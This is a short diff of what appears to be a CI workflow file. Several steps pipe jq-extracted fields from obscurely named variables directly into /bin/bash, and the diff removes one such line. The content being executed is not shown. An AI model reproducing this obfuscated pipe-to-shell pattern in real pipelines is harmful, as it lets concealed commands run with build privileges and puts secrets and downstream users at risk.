@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$d894" | jq -r .gst6 | /bin/bash
           echo $bjctb08715 | jq -r .uot0221 | /bin/bash
           echo $ulx1 | jq -r .w9 | /bin/bash
-          echo $ntcm63 | jq -r .shgrv270 | /bin/bash
           printf '%s' "$eygp814" | jq -r .gyx4 | /bin/bash
 
       - name: Save data
